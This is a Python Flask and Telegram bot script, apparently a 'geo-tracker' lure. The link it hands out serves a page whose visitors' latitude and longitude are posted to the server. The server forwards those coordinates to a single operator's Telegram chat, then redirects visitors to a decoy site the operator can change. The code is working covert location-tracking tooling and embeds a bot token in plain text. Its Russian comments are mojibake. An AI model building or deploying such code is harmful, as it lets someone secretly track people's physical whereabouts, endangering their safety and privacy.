from flask import Flask, request, send_from_directory, jsonify
import telebot
from telebot import types
import threading
from flask_cors import CORS
import os
import requests
from io import BytesIO

# === Flask app ===
app = Flask(__name__, static_folder='static')
CORS(app)

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888  # –¢–æ–ª—å–∫–æ —Ç—ã

bot = telebot.TeleBot(BOT_TOKEN)

# URL —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –º–µ–Ω—è—Ç—å —á–µ—Ä–µ–∑ –±–æ—Ç–∞
redirect_url = "https://yandex.ru"

# üîÅ –†–æ—É—Ç: –æ—Ç–¥–∞—Ç—å HTML
@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

# üì° –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞
@app.route('/send_location', methods=['POST'])
def receive_location():
    data = request.get_json()
    lat = data.get('latitude')
    lon = data.get('longitude')
    if lat and lon:
        bot.send_message(CHAT_ID, f"üìç –ù–æ–≤–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n–®–∏—Ä–æ—Ç–∞: {lat}\n–î–æ–ª–≥–æ—Ç–∞: {lon}")
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

# üîÅ –í–µ—Ä–Ω—É—Ç—å —Ç–µ–∫—É—â–∏–π redirect_url
@app.route('/get_redirect')
def get_redirect():
    return jsonify({"redirect_url": redirect_url})

# === Telegram bot ===
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'
user_waiting_for_url = set()

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.chat.id != CHAT_ID:
        bot.reply_to(message, "üö´ –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω.")
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç', '–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É')
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç')
def ask_redirect(message):
    if message.chat.id != CHAT_ID:
        return
    bot.send_message(message.chat.id, "–ü—Ä–∏—à–ª–∏ –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (http:// –∏–ª–∏ https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
def set_redirect_from_message(message):
    global redirect_url
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        redirect_url = url
        bot.send_message(message.chat.id, f"‚úÖ –†–µ–¥–∏—Ä–µ–∫—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "‚ùå –°—Å—ã–ª–∫–∞ –¥–æ–ª–∂–Ω–∞ –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å http:// –∏–ª–∏ https://")

@bot.message_handler(func=lambda m: m.text == '–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É')
def send_render_link(message):
    if message.chat.id != CHAT_ID:
        return
    bot.send_message(message.chat.id, f"–í–æ—Ç —Ç–≤–æ—è —Å—Å—ã–ª–∫–∞:\n{RENDER_URL}")

# === –ó–∞–ø—É—Å–∫ ===
def run_bot():
    bot.remove_webhook()
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
